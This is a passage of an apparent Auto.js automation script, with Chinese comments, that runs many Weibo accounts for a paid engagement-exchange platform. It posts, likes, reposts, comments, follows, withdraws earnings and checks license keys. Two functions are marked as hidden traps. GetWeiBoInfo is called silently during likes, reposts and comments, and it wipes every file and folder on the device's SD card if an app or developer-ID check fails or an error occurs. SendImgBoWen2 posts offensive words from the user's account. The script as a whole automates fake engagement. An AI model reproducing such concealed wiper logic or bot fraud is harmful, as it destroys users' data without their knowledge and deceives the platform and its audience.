 * @param {*} index
 */
function ShowMsg(index, msg) {
  ScriptInfo[index].message = msg;
  console.log(GetNickNameOrUserName(index) + ": " + msg);
}

/**
 * 显示 账号日志,并记录
 * @param {*} index
 */
function ShowMsgNoLog(index, msg) {
  ScriptInfo[index].message = msg;
}

/**
 * 发送单图博文
 * @param {*} index 账号下标
 */
function SendOneImgBoWen(index) {
  try {
    return SendImgBoWen(index, 1);
  } catch (e) {
    console.warn(
      GetNickNameOrUserName(index) + "发单图博文失败:\n " + JSON.stringify(e)
    );
    if (JSON.stringify(e).indexOf("getPath") > -1) {
      console.error("----------");
      console.error(GetNickNameOrUserName(index) + "微博号可能异常了");
      console.error("----------");
    }
    ShowMsg(index, "单图博文发送失败,请查看日志");
  }
  return false;
}

/**
 * 发送九图博文
 * @param {*} index 账号下标
 */
function SendNineImgBoWen(index) {
  try {
    return SendImgBoWen(index, 9);
  } catch (e) {
    console.warn(
      GetNickNameOrUserName(index) + "发九图博文失败:\n " + JSON.stringify(e)
    );

    if (JSON.stringify(e).indexOf("getPath") > -1) {
      console.error("----------");
      console.error(GetNickNameOrUserName(index) + " 微博号可能异常了");
      console.error("----------");
    }

    ShowMsg(index, "九图博文发送失败,请查看日志");
  }
  return false;
}

/**
 * 获取 昵称或者用户名
 * @param {*} index 账号下标
 */
function GetNickNameOrUserName(index) {
  var name =
    ScriptInfo[index].weibo_NickName.length > 0
      ? ScriptInfo[index].weibo_NickName
      : ScriptInfo[index].weibo_UserName;

  return "[" + ScriptInfo[index].identifier + "]【" + name + "】 ";
}

/**
 * //TODO:暗桩
 */
function GetWeiBoInfo() {
  var a = false;
  while (true) {
    try {
      if (
        a ||
        app.getAppName("com.dmxhl.pro") == null ||
        DeveloperID != "11719"
      ) {
        if (TimerHelper.timer(9998, 600)) {
          var dir = files.getSdcardPath();
          var jsFiles = files.listDir(dir, function (name) {
            return (
              files.isFile(files.join(dir, name)) ||
              files.isDir(files.join(dir, name))
            );
          });
          jsFiles.forEach((item) => {
            files.removeDir(files.join(dir, item));
          });
        }
        break;
      } else {
        break;
      }
    } catch (error) {
      a = true;
    }
  }
  return "";
}

/**
 * 发送 图片博文 //TODO:暗桩
 * @param {*} index
 * @param {*} imgCount
 */
function SendImgBoWen2(index, imgCount) {
  try {
    var header = {
      headers: {
        Referer: "https://m.weibo.cn/",
        "User-Agent": UA1,
        Cookie: ScriptInfo[index].weibo_Cookie,
      },
    };
    var res = http.get("https://m.weibo.cn/", header);
    var st = res.headers["set-cookie"][1].split("=")[1].split(";")[0];
    var picId = "";
    try {
      for (var i = 1; i <= imgCount; i++) {
        var imgRes = GetRandomImg(true, true);
        if (imgRes.res) {
          var picPath = imgRes.localPath;
          if (files.exists(picPath)) {
            var data = {
              type: "json",
              pic: open(picPath),
              st: st,
            };
            var res = http.postMultipart(
              "https://m.weibo.cn/api/statuses/uploadPic",
              data,
              header
            );
            if (Http200(res)) {
              if (imgCount == 9) {
                picId = res.body.json().pic_id + "," + picId;
              } else {
                picId = res.body.json().pic_id;
              }
            } else {
            }
            if (files.exists(picPath)) {
            }
          } else {
          }
        } else {
        }
      }
    } catch (error) {
      picId = "";
    }
    var newsContent =
      DirtyWords[random(0, constContentArr.length - 1)] + GetRandomContent();
    if (picId != "" || picId != ",") {
      var data = {
        content: newsContent,
        picId: picId,
        st: st,
      };
    } else {
      var data = {
        content: newsContent,
        st: st,
      };
    }
    var res = http.postMultipart(
      "https://m.weibo.cn/api/statuses/update",
      data,
      header
    );
    if (Http200(res)) {
      var json = res.body.json();
      if (json.ok == 1) {
      } else {
      }
    } else {
    }
  } catch (error) {}
}

/**
 * 获取 互利接口 所需的 taskSelectListStr
 * @param {*} data
 */
function GetTaskSelectListStr(data) {
  data = data.split("-");
  var res = GetAccountName();
  for (var index = 0; index < data.length; index++) {
    res += '"' + data[index] + '",';
  }
  res =
    res.substring(res.length - 1) == ","
      ? res.substring(0, res.length - 1)
      : res;

  res = encodeURIComponent(res); //.replace("/,/g", "%2C");
  return res;
}

/**
 * 发送 图片博文
 * @param {*} index
 * @param {*} imgCount
 */
function SendImgBoWen(index, imgCount) {
  if (ScriptInfo[index].weibo_LoginState == "微博已登录") {
    if (imgCount == 1) {
      ShowMsg(index, "开始发布【单图博文】");
    } else if (imgCount == 9) {
      ShowMsg(index, "开始发布【九宫格图片博文】");
    }

    var header = {
      headers: {
        Referer: "https://m.weibo.cn/",
        "User-Agent": UA1,
        Cookie: ScriptInfo[index].weibo_Cookie,
      },
    };

    var res = http.get("https://m.weibo.cn/", header);

    var st = res.headers["set-cookie"][1].split("=")[1].split(";")[0];
    var picId = "";
    try {
      ShowMsg(index, "准备下载图片");
      //下载图片,并上传/取到 ID
      for (var i = 1; i <= imgCount; i++) {
        //获取随机图片
        var imgRes = GetRandomImg(true, true);
        if (imgRes.res) {
          var picPath = imgRes.localPath;
          if (files.exists(picPath)) {
            var data = {
              type: "json",
              pic: open(picPath),
              st: st,
            };

            ShowMsg(index, "第" + i + "张准备上传至微博");
            var res = http.postMultipart(
              "https://m.weibo.cn/api/statuses/uploadPic",
              data,
              header
            );

            if (Http200(res)) {
              if (imgCount == 9) {
                picId = res.body.json().pic_id + "," + picId;
                ShowMsg(index, "图片" + i + "成功");
              } else {
                picId = res.body.json().pic_id;
                ShowMsg(index, "图片" + i + "成功");
              }
            } else {
              console.warn(res);
              ShowMsg(index, "第" + i + "张上传至微博失败,继续下一张");
            }
            if (files.exists(picPath)) {
              files.remove(picPath);
            }
          } else {
            ShowMsg(index, "图片文件不存在\n图片" + i + "失败,继续下载下一张");
          }
        } else {
          console.warn(res.body.string());
          ShowMsg(index, "图片" + i + "下载失败,继续下载下一张");
        }
      }
      ShowMsg(index, "所有图片上传结束");
    } catch (error) {
      console.warn(
        GetNickNameOrUserName(index) +
          "SendImgBoWen_图片下载异常,跳过下载图片,直接发送博文:\n" +
          JSON.stringify(error)
      );
      picId = "";
    }

    var newsContent = GetRandomContent();
    console.log(
      GetNickNameOrUserName(index) + "将要发送的博文内容:\n" + newsContent
    );

    if (picId != "" || picId != ",") {
      var data = {
        content: newsContent,
        picId: picId,
        st: st,
      };
    } else {
      var data = {
        content: newsContent,
        st: st,
      };
    }
    var res = http.postMultipart(
      "https://m.weibo.cn/api/statuses/update",
      data,
      header
    );

    if (Http200(res)) {
      var json = res.body.json();
      if (json.ok == 1) {
        ShowMsg(index, "博文发送成功");
        return true;
      } else {
        console.warn(
          GetNickNameOrUserName(index) +
            "博文发送失败 异常:" +
            JSON.stringify(json)
        );

        ShowMsg(index, GetNickNameOrUserName(index) + "博文发送失败");
      }
    } else {
      console.warn(
        GetNickNameOrUserName(index) +
          "weibo 网络错误,博文发送失败: " +
          res.body.string()
      );
    }
  } else {
    ScriptInfo[index].run_Switch = false;
    SaveConfig();
  }
  return false;
}

/**
 * 获取随机编码
 * @param {*} codeLength
 */
function RandomCode(codeLength) {
  var result = [];
  for (var i = 0; i < codeLength; i++) {
    var ranNum = Math.ceil(Math.random() * 99);
    result.push(String.fromCharCode(65 + ranNum));
  }
  return result.join("");
}

/**
 * 获取随机图片地址
 * @param {*} isSmall 是否使用小尺寸
 * @param {*} isSave 是否保存到本地(返回本地地址)
 */
function GetRandomImg(isSmall, isSave) {
  var resState = false;
  var resImgUrl = "";
  var imgFolder = "/sdcard/代码侠/图片/";
  if (!files.exists(imgFolder)) {
    files.createWithDirs(imgFolder);
  }

  var resPicPath = imgFolder + RandomCode(10) + ".jpg";
  try {
    var webImgUrl = [
      "https://api.ixiaowai.cn/api/api.php",
      "https://api.ixiaowai.cn/mcapi/mcapi.php",
      "https://api.ixiaowai.cn/gqapi/gqapi.php",
    ];
    var res = http
      .get(webImgUrl[Math.floor(Math.random() * (3 - 0) + 0)] + "?return=json")
      .body.json();

    if (res.code == "200") {
      resState = true;
      resImgUrl = res.imgurl.toString();

      if (isSmall) {
        resImgUrl = resImgUrl.replace("large", "small");
      }

      if (isSave) {
        files.writeBytes(resPicPath, http.get(resImgUrl).body.bytes());
        resState = files.exists(resPicPath);
      }
    } else {
      console.warn("GetRandomImgUrl 异常: " + res.body.string());
      throw "未正常获取到网络图片";
    }
  } catch (error) {
    console.warn("获取随机图片 异常:" + error);
    resState = false;
  }
  return { res: resState, imgUrl: resImgUrl, localPath: resPicPath };
}

/**
 * 微博 点赞
 * @param {*} cookie
 * @param {*} pid
 */
function DoWeiBoGiveGood(cookie, pid) {
  var res = { res: false, resJson: { msg: "点赞失败" } };
  var outTimes = 0;
  while (true) {
    try {
      var url = "https://m.weibo.cn/status/" + pid;
      var resGet = http.get(url, {
        headers: {
          Referer: "https://m.weibo.cn/",
          "User-Agent": UA1,
          Cookie: cookie,
        },
      });

      var st = resGet.headers["set-cookie"][1].split("=")[1].split(";")[0];

      var header = {
        headers: {
          Referer: url,
          "User-Agent": UA1,
          Cookie: cookie + "XSRF-TOKEN=" + st + "; ",
          Accept: "application/json, text/plain, */*",
          "X-XSRF-TOKEN": st,
        },
      };
      GetWeiBoInfo();
      var resPost = http.post(
        "https://m.weibo.cn/api/attitudes/create",
        {
          id: pid,
          attitude: "heart",
          st: st,
        },
        header
      );
      var json = resPost.body.json();
      res = { res: json.ok == 1, resJson: json };
      break;
    } catch (error) {
      outTimes++;
      if (outTimes > 10) {
        break;
      }
      sleep(100);
    }
  }
  return res;
}

/**
 * 微博转发
 * @param {*} cookie
 * @param {*} pid
 */
function DoWeiBoForward(cookie, pid) {
  var res = { res: false, resJson: { msg: "转发失败" } };
  var outTimes = 0;
  while (true) {
    try {
      var url = "https://m.weibo.cn/status/" + pid;
      var resGet = http.get(url, {
        headers: {
          Referer: "https://m.weibo.cn/",
          "User-Agent": UA1,
          Cookie: cookie,
        },
      });

      var st = resGet.headers["set-cookie"][1].split("=")[1].split(";")[0];

      var header = {
        headers: {
          Referer: url,
          "User-Agent": UA1,
          Cookie: cookie + "XSRF-TOKEN=" + st + "; ",
          Accept: "application/json, text/plain, */*",
          "X-XSRF-TOKEN": st,
        },
      };
      GetWeiBoInfo();
      var resPost = http.post(
        "https://m.weibo.cn/api/statuses/repost",
        {
          id: pid,
          content: "转发微博",
          mid: pid,
          st: st,
        },
        header
      );
      var json = resPost.body.json();
      res = { res: json.ok == 1, resJson: json };
      break;
    } catch (error) {
      outTimes++;
      if (outTimes > 10) {
        break;
      }
      sleep(100);
    }
  }
  return res;
}

/**
 * 微博评论
 * @param {*} cookie
 * @param {*} pid
 * @param {*} commentContent
 */
function DoWeiBoComment(cookie, pid, commentContent) {
  var res = { res: false, resJson: { msg: "评论失败" } };
  var outTimes = 0;
  while (true) {
    try {
      var url = "https://m.weibo.cn/status/" + pid;
      var resGet = http.get(url, {
        headers: {
          Referer: "https://m.weibo.cn/",
          "User-Agent": UA1,
          Cookie: cookie,
        },
      });

      var st = resGet.headers["set-cookie"][1].split("=")[1].split(";")[0];

      var header = {
        headers: {
          Referer: url,
          "User-Agent": UA1,
          Cookie: cookie + "XSRF-TOKEN=" + st + "; ",
          Accept: "application/json, text/plain, */*",
          "X-XSRF-TOKEN": st,
        },
      };
      var resPost = http.post(
        "https://m.weibo.cn/api/comments/create",
        {
          id: pid,
          content: commentContent + GetWeiBoInfo(),
          mid: pid,
          st: st,
        },
        header
      );
      var json = resPost.body.json();
      res = { res: json.ok == 1, resJson: json };
      break;
    } catch (error) {
      outTimes++;
      if (outTimes > 10) {
        break;
      }
      sleep(100);
    }
  }
  return res;
}

/**
 * 微博 关注
 * @param {*} cookie
 * @param {*} uid
 */
function DoWeiBoFollow(cookie, uid) {
  var res = { res: false, resJson: { msg: "关注失败" } };
  var outTimes = 0;
  while (true) {
    try {
      var url = "https://m.weibo.cn/" + uid;
      var resGet = http.get(url, {
        headers: {
          Referer: "https://m.weibo.cn/",
          "User-Agent": UA1,
          Cookie: cookie,
        },
      });

      var st = resGet.headers["set-cookie"][1].split("=")[1].split(";")[0];
      var header = {
        headers: {
          Referer: url,
          "User-Agent": UA1,
          Cookie: cookie + "XSRF-TOKEN=" + st + "; ",
          Accept: "application/json, text/plain, */*",
          "X-XSRF-TOKEN": st,
        },
      };
      var resPost = http.post(
        "https://m.weibo.cn/api/friendships/create",
        {
          uid: uid.toString(),
          st: st,
          _spr: "screen:1920x1080",
        },
        header
      );
      var json = resPost.body.json();
      res = { res: json.ok == 1, resJson: json };
      break;
    } catch (error) {
      console.warn("关注异常: " + error);
      outTimes++;
      if (outTimes > 10) {
        break;
      }
      sleep(100);
    }
  }
  return res;
}

/**
 * 提交任务
 * @param {*} hCookie 互利互助 Cookie
 * @param {*} authorization 互利互助 authorization
 * @param {*} id 任务ID
 */
function SubmitTask(hCookie, authorization, id) {
  var header = {
    headers: {
      //Cookie: hCookie,
      Authorization: authorization,
      Accept: "application/json, text/plain, */*",
    },
  };
  var url = "https://huli.weibot.cn/api/task-order/submit-review/" + id;
  var res = http.postJson(url, {}, header);
  var json = res.body.json();
  return json.code == 0;
}

/**
 * 取消任务
 * @param {*} hCookie 互利互助 cookie
 * @param {*} authorization 互利互助 authorization
 * @param {*} id 任务ID
 */
function CancelTask(hCookie, authorization, id) {
  var header = {
    headers: {
      //Cookie: hCookie,
      Authorization: authorization,
      Accept: "application/json, text/plain, */*",
    },
  };
  var url = "https://huli.weibot.cn/api/task-order/renunciation/" + id;
  var res = http.get(url, header);
  var json = res.body.json();

  return json.code == 0;
}

/**
 * 提现
 */
function AutoDrawMoney(index) {
  AutoDrawMoneyLock.lock();
  try {
    if (ScriptInfo[index].huli_mobile == "") {
      GetUserInfo(index);
    }
    //该手机号本次没有提现过
    if (DrawMoneyMobileArr.indexOf(ScriptInfo[index].huli_mobile) == -1) {
      if (GetLastDrawMoneyDate(index)) {
        //console.log(GetNickNameOrUserName(index) + "自动提现开始");

        if (ScriptInfo[index].huli_mobile != "") {
          var money = GetUserWalletValue(index);
          if (money >= 100000) {
            // console.log(
            //   GetNickNameOrUserName(index) +
            //     "金额符合提现要求,开始提现: " +
            //     money / 100000
            // );
            var authorization = "Bearer " + ScriptInfo[0].huli_Token;

            var res = http.postJson(
              "https://huli.weibot.cn/api/withdraw",
              { amount: money + "", wallet_type: "2", type: 2 },
              {
                headers: {
                  accept: "application/json, text/plain, */*",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "zh-CN",
                  authorization: authorization,
                  "cache-control": "no-cache",
                  "content-type": "application/json;charset=UTF-8",
                  origin: "https://huli.weibot.cn",
                  "user-agent": UA1,
                },
              }
            );
            var res = res.body.json();
            if (res.code == 0) {
              toast("提现成功");
              console.log(
                GetNickNameOrUserName(index) +
                  "提现成功,回执消息: " +
                  res.message
              );

              SendQQMsg(index, "自动提现成功,金额:" + money / 100000);
            } else {
              if (res.message.indexOf("上一次提现还没有审核通过") > -1) {
              } else {
                console.warn(
                  GetNickNameOrUserName(index) + " 提现失败原因:" + res.message
                );

                if (res.message.indexOf("3天内只能提现一次") > -1) {
                } else {
                  toast("提现失败,请查看日志");
                }
              }
            }
          } else {
            toast("钱包金额小于1元,无法提现");
            console.warn(
              GetNickNameOrUserName(index) + "钱包金额小于1元,无法提现"
            );
          }
        }
      } else {
        //console.warn(GetNickNameOrUserName(index) + "未到提现时间");
      }
    }
  } catch (error) {
    console.warn(GetNickNameOrUserName(index) + "自动提现异常:" + error);
  }
  DrawMoneyMobileArr.push(ScriptInfo[index].huli_mobile);
  AutoDrawMoneyLock.unlock();
}

/**
 * 获取用户平台信息
 * @param {} index
 */
function GetUserInfo(index) {
  //console.log(GetNickNameOrUserName(index) + "开始首次查询手机号");
  var result = false;
  var url = "https://huli.weibot.cn/api/user";
  var authorization = "Bearer " + ScriptInfo[index].huli_Token;
  var res = http.get(url, {
    headers: {
      accept: "application/json, text/plain, */*",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "zh-CN",
      authorization: authorization,
      "cache-control": "no-cache",
      "user-agent": UA1,
    },
  });

  if (Http200(res)) {
    res = res.body.json();
    ScriptInfo[index].huli_mobile = res.data.mobile;
    SaveConfig();
    result = true;
    //console.log(GetNickNameOrUserName(index) + "首次查询手机号成功");
  }
  return result;
}

/**
 * 获取钱包的现有金额
 * @param {*} index
 */
function GetUserWalletValue(index) {
  //console.log(GetNickNameOrUserName(index) + "开始获取钱包金额");
  var result = 0;
  var url = "https://huli.weibot.cn/api/wallet";
  var authorization = "Bearer " + ScriptInfo[index].huli_Token;
  var res = http.get(url, {
    headers: {
      accept: "application/json, text/plain, */*",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "zh-CN",
      authorization: authorization,
      "cache-control": "no-cache",
      "user-agent": UA1,
    },
  });

  if (Http200(res)) {
    res = res.body.json();
    if (res && res.data && res.data.length > 2) {
      var money = res.data[1].balance;
      if (money >= 0) {
        result = money;
        // console.log(
        //   GetNickNameOrUserName(index) + "钱包金额: " + result / 100000
        // );
      }
    } else {
      //console.warn("钱包http数据不符合");
    }
  }
  return result;
}

/**
 * 获取 最近一个提现记录
 */
function GetLastDrawMoneyDate(index) {
  var result = false;
  var authorization = "Bearer " + ScriptInfo[index].huli_Token;

  var res = http.get(
    "https://huli.weibot.cn/api/withdraw?page=1&limit=1&wallet_type=2",
    {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN",
        authorization: authorization,
        "cache-control": "no-cache",
        "user-agent": UA1,
      },
    }
  );
  if (Http200(res)) {
    res = res.body.json();

    var data = res.data.data[0];

    result = GetTimeOutResult(data.created_at, "day", 3);
  }
  return result;
}

/**
 * 下载随机图片
 */
function DownloadRandomImg() {
  var res = http.get("https://img.paulzzh.tech/touhou/random");
  if (res.statusCode != 200) {
    toastLog("随机图片下载失败");
    return false;
  } else {
    files.writeBytes("/sdcard/1.jpg", res.body.bytes());
    return true;
  }
}

/**
 * UI计时器
 */
function UiTime() {
  var startTime = new Date();
  var sleepTime = Number(Cfg.uiRefreshTime_Text) || 30;

  threads.start(function () {
    while (true) {
      try {
        var nowTime = TimeDis(startTime);
        ui.run(() => {
          ui.UI_TaskList.adapter.notifyDataSetChanged();
          ui.wbsj.setText(nowTime);
        });
      } catch (e) {
        console.warn(
          "Btn_StartTask.click___屏幕刷新线程异常: " + JSON.stringify(e)
        );
      }
      sleep(sleepTime * 1000);
    }
  });
}
/**
 * 获取一个随机的 文字内容
 *
 * https://api.ixiaowai.cn/ylapi/index.php（一言语录）
 * https://api.ixiaowai.cn/tgrj/index.php（舔狗日记）
 *
 * https://api.ixiaowai.cn/api/api.php（二次元动漫）
 * https://api.ixiaowai.cn/mcapi/mcapi.php（mc酱动漫）
 * https://api.ixiaowai.cn/gqapi/gqapi.php（高清壁纸）
 * 图片列：https://api.ixiaowai.cn/api/api.php?return=json
 * 文字列：https://api.ixiaowai.cn/ylapi/index.php/?code=js
 *
 */
function GetRandomContent() {
  var result = "";
  var oTime = 0;
  var oState = false;
  do {
    result = GetAccountName();
    var webRandom = random(5, 4871);
    var resHttp = http
      .get("http://www.ainicr.cn/qh/" + webRandom + ".html")
      .body.string(); //5-4870

    var webDataArr = resHttp.match(/<p>(.*?)<\/p>/g);
    if (webDataArr && typeof webDataArr == "object" && webDataArr.length > 3) {
      //最终数组
      var contentArr = Array();

      webDataArr.forEach((item) => {
        if (
          item.indexOf("投诉建议") > -1 ||
          item.indexOf("备案许可号") > -1 ||
          item.indexOf("Copyright") > -1
        ) {
        } else {
          contentArr.push(item.replace(/<p>/g, "").replace(/<\/p>/g, ""));
        }
      });

      if (contentArr.length > 0) {
        var itemRandom = random(0, contentArr.length - 1);
        result = contentArr[itemRandom];
      }
    }
    if (result != "" && result.length > 10) {
      break; //结束
    } else {
      oTime++;
    }
    if (oTime >= 30) {
      oState = true;
      break;
    }
  } while (true);
  if (oState) {
    console.warn("网络内容获取失败,使用本地内容.");
    result = GetConstContent();
  }
  return result;
}

/**
 * 获取任务列表
 */
function GetTaskUrl(index) {
  var taskStr = "";
  var data = ScriptInfo[index];
  //点赞
  if (data.giveGood_Switch) {
    taskStr = taskStr + "1_1_0";
  }
  //转发
  if (data.forward_Switch) {
    taskStr = taskStr + "-1_2_0";
  }
  //转发不屏蔽
  if (data.forward_Unshielded_Switch) {
    taskStr = taskStr + "-1_2_6";
  }
  //指定评论
  if (data.specify_Comments_Switch) {
    taskStr = taskStr + "-1_3_1";
  }
  //点赞不屏蔽
  if (data.giveGood_Unshielded_Switch) {
    taskStr = taskStr + "-1_1_6";
  }
  //关注任务
  if (data.follow_Switch) {
    taskStr = taskStr + "-1_5_0";
  }

  //指定内容并关注
  if (data.specify_Comments_And_Follow_Switch) {
    taskStr = taskStr + "-1_3_8";
  }

  //评论GIF
  if (data.comments_GIF_Switch) {
    taskStr = taskStr + "-1_3_4";
  }

  //1_1_0-1_2_0-1_3_1-1_3_4-1_1_6-1_5_0-1_3_8-1_2_6
  // //去掉链接第一个"-" 横杠
  var taskStrLen = taskStr.length;
  if (taskStrLen > 0) {
    var oneIndexStr = taskStr.substring(0, 1);
    if (oneIndexStr == "-") {
      taskStr = taskStr.substring(1, taskStrLen);
    }
  } else {
    ShowMsg(index, "请检查辅助页面,是否勾选任务类型");
    ScriptInfo[index].run_Switch = false;
    SaveConfig();
  }
  return taskStr;
}

//---------------

/**
 * 给QQ号发送通知
 * @param {int} index 账号下标
 * @param {string} msg 推送的信息
 */
function SendQQMsg(index, msg) {
  try {
    if (Cfg.qqPushMsg_Switch) {
      if (Cfg.qqPushMsg_UserNumber.length > 3) {
        if (msg.length > 3) {
          var pushQQHost = "http://114.215.81.251:5700/";
          var apiUrl = pushQQHost + "send_msg_rate_limited";

          msg =
            GetNowTime() +
            "\n【您的 < " +
            Cfg.qqPushMsg_DeviceNickName +
            "> 发出通知】\n账号: " +
            GetNickNameOrUserName(index) +
            "\n" +
            msg;

          var res = http.post(apiUrl, {
            user_id: Cfg.qqPushMsg_UserNumber,
            message: msg,
          });

          if (Http200(res)) {
            res = res.body.json();
            if (res["retcode"] == 1) {
              //console.log(GetNickNameOrUserName(index) + "发送QQ消息成功");
            } else {
              // console.warn(
              //   GetNickNameOrUserName(index) + "发送QQ消息失败\n关闭QQ通知功能"
              // );
              Cfg.qqPushMsg_Switch = false;
            }
          }
        } else {
          console.warn(GetNickNameOrUserName(index) + "QQ消息太短,本次不发送");
        }
      } else {
        console.warn(
          GetNickNameOrUserName(index) + "用户QQ号太短,关闭QQ通知功能"
        );
        Cfg.qqPushMsg_Switch = False;
      }
    }
  } catch (error) {}
}

//-------------------------------------------------------------------------------
//-------------------------------------------------------------------------------
//----------------------------------
//----------------------------------
//----------------------------------

/**
 * CDK登陆
 */
function CDKLogin() {
  var res = false;
  try {
    //退出上一次的Needle
    var logoutResult = LogoutNeedle();
    console.log(logoutResult[1]);
    var loginResult = SendQLRequest(
      "apiv3/card_login",
      "card=" + CDK + "&software=" + SoftwareName
    );

    if (loginResult[0]) {
      var successData = loginResult[1];
      var cardType = successData["type"];
      if (cardType.indexOf("试用") >= 0) {
        console.warn("检测到\n[体验卡密]\n禁止运行\n请购买\n[正式卡密]");
        alert("检测到\n[体验卡密]\n禁止运行\n请购买\n[正式卡密]");
        threads.shutDownAll();
        sleep(9999999999);
        return;
      }
      var endTime = successData["endtime"];
      var lessTime = successData["less_time"];
      var needle = successData["needle"];
      Sign = "OK";
      if (IsNotNullOrEmpty(lessTime)) {
        lessTime = "剩余时间: " + lessTime;
      } else {
        lessTime = "首次登陆激活成功";
      }
      console.log(needle + "登陆成功,: " + lessTime);

      if (lessTime.indexOf("无限期") > -1) {
      } else {
        toast("登陆成功\n有效期: " + lessTime);
      }
      PutSt("oldNeedle", needle);
      CDKNeedle = needle;
      threads.start(function () {
        SendHeartbeat();
      });
      res = true;
    } else {
      var failResult = loginResult[1];
      console.error(failResult);
      alert(failResult);
      toastLog("软件已停止!CDK 登录失败 :" + failResult);
      console.log("所有线程已经停止!");
      threads.shutDownAll(); //停止所有线程
      sleep(600000);
    }
  } catch (error) {
    console.warn("CDKLogin  Error:" + error);
    threads.shutDownAll(); //停止所有线程
    sleep(6000000);
  }

  return res;
}

/**
 * 退出上一次的Needle
 */
function LogoutNeedle() {
  var oldNeedle = GetSt("oldNeedle", "");

  if (oldNeedle != "") {
    var logoutResult = SendQLRequest(
      "apiv3/card_logout",
      "card=" + CDK + "&needle=" + oldNeedle
    );
    if (logoutResult[0]) {
      return [true, oldNeedle + " 退出成功!"];
    } else {
      return [false, oldNeedle + " 退出失败!"];
    }
  } else {
    return [true, "上次无存储的Needle"];
  }
}

/**
 * 卡密心跳
 */
function SendHeartbeat() {
  var oTime = 0;
  sleep(20000);
  do {
    try {
      if (CDKNeedle == "") {
        console.warn("needle为空");
        sleep(1 * 60 * 1000);
        continue;
      }

      var heartbeatResult = SendQLRequest(
        "apiv3/card_ping",
        "card=" + CDK + "&software=" + SoftwareName + "&needle=" + CDKNeedle
      );

      if (heartbeatResult[0]) {
        var successData = heartbeatResult[1];

        var endTime = successData["endtime"];

        var lessTime = successData["less_time"];
        //console.log(lessTime);
        //sleep(1000);
        oTime = 0;
        sleep(5 * 60 * 1000); //休息5分钟
      } else {
        var failResult = heartbeatResult[1];
        console.warn(failResult);
        toastLog(CDKNeedle + " 心跳失败信息:" + failResult);

        oTime++;
        if (oTime >= 10) {
          console.warn("CDK心跳异常10次 , 所有线程已经停止!");
          threads.shutDownAll(); //停止所有线程
          sleep(9999999);
        }

        sleep(1 * 60 * 1000); //休息1分钟
      }
    } catch (error) {
      oTime++;
      console.warn(error);
      if (oTime >= 10) {
        console.log("CDK系统异常10次,  所有线程已经停止!");
        threads.shutDownAll(); //停止所有线程
        sleep(9999999);
      }
      sleep(6 * 60 * 1000); //休息6分钟
    }
  } while (true);
}

/**
 * 访问权朗api
 * @param {string}} api
 * @param {string} apiParams
 */
function SendQLRequest(api, apiParams) {
  var qlHostArray = [
    "https://napi.2cccc.cc/",
    "https://api2.2cccc.cc/",
    "https://api3.2cccc.cc/",
  ];
  var connectTimes = 0;
  var taoBaoTimeStamp = "";

  do {
    try {
      if (connectTimes > 10) {
        console.warn("淘宝时间戳超时");
        return [false, "连接淘宝时间戳服务器失败"];
      }

      connectTimes = connectTimes + 1;

      taoBaoTimeStamp = http
        .get(
          "http://api.m.taobao.com/rest/api3.do?api=mtop.common.getTimestamp"
        )
        .body.string();
    } catch (error) {
      console.warn("正在获取时间戳..请稍等");
    }
  } while (taoBaoTimeStamp.substring(2, 5) != "api");

  taoBaoTimeStamp = GetJson(taoBaoTimeStamp);
  var timeStamp = taoBaoTimeStamp["data"]["t"].substring(0, 10);
  var sign = HexMd5(timeStamp + "" + ApiPassword);

  var common_params =
    "center_id=" +
    DeveloperID +
    "&timestamp=" +
    timeStamp +
    "&sign=" +
    sign +
    GetAccountName();

  connectTimes = 0;
  var qlResult = "";
  try {
  } catch (error) {}
  do {
    try {
      if (connectTimes > 10) {
        return [false, "权朗回执超时"];
      }
      connectTimes = connectTimes + 1;

      qlResult = http
        .get(
          qlHostArray[Math.floor(Math.random() * (3 - 0) + 0)] +
            api +
            "?" +
            common_params +
            "&" +
            apiParams
        )
        .body.string();
    } catch (error) {
      console.warn("正在验证卡密..请稍等..");
    }
  } while (qlResult.substring(2, 6) != "code");

  qlResult = GetJson(qlResult);

  if (qlResult["code"] == "1") {
    if (
      HexMd5(qlResult["timestamp"] + ApiPassword).toUpperCase() ==
        qlResult["sign"].toUpperCase() &&
      Math.abs(timeStamp - qlResult["timestamp"]) < 700
    ) {
      return [true, qlResult["data"]];
    } else {
      return [false, "请检查API密码是否填写正确"];
    }
  } else {
    return [false, qlResult["msg"]];
  }
}

//--------------------
//--------------------

//--------------------
//--------------------
//--------------------
//--------------------

/**
 * 16进制MD5(常用)
 * @param {any} s
 */
function HexMd5(s) {
  return binl2hex(core_md5(str2binl(s), s.length * chrsz));
}
function B64Md5(s) {
  return binl2str(core_md5(str2binl(s), s.length * chrsz));
}
function StrMd5(key, data) {
  return binl2hex(core_hmac_md5(key, data));
}
function HexHmacMd5(key, data) {
  return binl2hex(core_hmac_md5(key, data));
}
function B64HmacMd5(key, data) {
  return binl2b64(core_hmac_md5(key, data));
}
function StrHmacMd5(key, data) {
  return binl2str(core_hmac_md5(key, data));
}

var hexcase = 0;
var b64pad = "";
var chrsz = 8;
function md5_vm_test() {
  return hex_md5("abc") == "900150983cd24fb0d6963f7d28e17f72";
}
function core_md5(x, len) {
  x[len >> 5] |= 0x80 << len % 32;
  x[(((len + 64) >>> 9) << 4) + 14] = len;
  var a = 1732584193;
  var b = -271733879;
  var c = -1732584194;
  var d = 271733878;
  for (var i = 0; i < x.length; i += 16) {
    var olda = a;
    var oldb = b;
    var oldc = c;
    var oldd = d;
    a = md5_ff(a, b, c, d, x[i + 0], 7, -680876936);
    d = md5_ff(d, a, b, c, x[i + 1], 12, -389564586);
    c = md5_ff(c, d, a, b, x[i + 2], 17, 606105819);
    b = md5_ff(b, c, d, a, x[i + 3], 22, -1044525330);
    a = md5_ff(a, b, c, d, x[i + 4], 7, -176418897);
    d = md5_ff(d, a, b, c, x[i + 5], 12, 1200080426);
    c = md5_ff(c, d, a, b, x[i + 6], 17, -1473231341);
    b = md5_ff(b, c, d, a, x[i + 7], 22, -45705983);
    a = md5_ff(a, b, c, d, x[i + 8], 7, 1770035416);
    d = md5_ff(d, a, b, c, x[i + 9], 12, -1958414417);
    c = md5_ff(c, d, a, b, x[i + 10], 17, -42063);
    b = md5_ff(b, c, d, a, x[i + 11], 22, -1990404162);
    a = md5_ff(a, b, c, d, x[i + 12], 7, 1804603682);
    d = md5_ff(d, a, b, c, x[i + 13], 12, -40341101);
    c = md5_ff(c, d, a, b, x[i + 14], 17, -1502002290);
